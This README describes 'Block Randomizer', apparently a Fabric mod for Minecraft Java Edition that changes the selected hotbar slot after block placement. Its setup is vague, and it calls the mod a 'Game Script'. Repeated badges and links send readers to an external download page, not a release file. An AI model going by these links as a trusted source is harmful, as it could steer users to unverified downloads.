# Block Randomizer v1.0.0 - Minecraft Java Edition Utility 2026

> **Client-side Fabric mod for Minecraft Java Edition that randomizes hotbar slot selection after block placement.** It adds variety to building by rotating between chosen hotbar slots and presenting clear in-game status markers.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Java%20Edition-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mattjamesnnf169/block-randomizer-fabric?style=flat-square)](https://github.com/mattjamesnnf169/block-randomizer-fabric)

---

<p align="center">
  <a href="https://mattjamesnnf169.github.io/block-randomizer-fabric/">
    <img src="https://img.shields.io/badge/Download-Block%20Randomizer%20Script-brightgreen?style=for-the-badge" alt="Download Block Randomizer Script">
  </a>
</p>

> **[Direct Download - Block Randomizer](https://mattjamesnnf169.github.io/block-randomizer-fabric/)**

---

[Download Latest Build](https://mattjamesnnf169.github.io/block-randomizer-fabric/)

---

## What it does

Block Randomizer is a Fabric mod for Minecraft Java Edition that changes the selected hotbar slot after a block is placed. Instead of keeping the same slot every time, it can jump to another slot from a user-defined set, which makes placement behavior feel less repetitive without altering the normal building loop.

It is meant for client-side use and includes visual feedback to indicate active slots. A RAND status label is also shown so you can tell at a glance when the feature is enabled. The mod is centered on responsive slot handling, reliable keybind toggling, and interface indicators that are easy to read during play.

## Script Features

- Randomly changes the selected hotbar slot after placing a block
- Supports a user-defined pool of allowed hotbar slots
- Can be turned on or off with a keybind
- Highlights enabled hotbar slots with visual indicators
- Shows a RAND active status indicator in the interface
- Client-side Fabric mod for Minecraft Java Edition
- Built around block placement flow and hotbar management
- Lightweight utility focused on gameplay interaction rather than content changes

## Setup

1. Download the latest build from the project download link.
2. Place the mod file in your Minecraft Fabric mods folder.
3. Launch Minecraft Java Edition with the matching Fabric setup.
4. Configure the enabled slots and toggle keybind in the mod settings, if available.

Example use flow:

- Enable the mod
- Define the hotbar slots you want included
- Place blocks as usual
- Let the mod switch to another allowed slot after placement

## Options

| Setting | Purpose |
| --- | --- |
| Enabled / Disabled | Turns random slot switching on or off |
| Slot pool | Limits randomization to selected hotbar slots |
| Keybind | Provides a quick toggle for the feature |
| Hotbar indicators | Marks which slots are active |
| RAND status | Displays current active state |

## Compatibility

Block Randomizer is designed for Minecraft Java Edition on the client side with Fabric. Since it focuses on hotbar behavior during block placement, it fits best in environments and versions where Fabric mods are supported.

Known limitations:

- Requires a Fabric-compatible Minecraft environment
- Works with hotbar-driven block placement behavior
- Visual elements depend on the in-game interface layout
- Behavior is tied to the selected slot pool and toggle state

## FAQ

### How do I install it?
Download the build, put it into the Fabric mods folder, and launch Minecraft Java Edition using the matching Fabric profile.

### How do I update it?
Swap out the older build for the newest file from the download link, then restart the game.

### Can I customize which slots are used?
Yes. The mod provides a slot pool so you can decide which hotbar positions can be selected.

### Does it work when disabled?
When toggled off, the mod should stop changing slots after placement and return to normal behavior.

### Will it change my inventory layout?
No. It does not introduce new items or inventory categories. It works with the existing hotbar and selected slot behavior.

### Where are settings stored?
Configuration is usually kept by the mod or Fabric environment in the local Minecraft profile data, depending on how the mod is set up.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
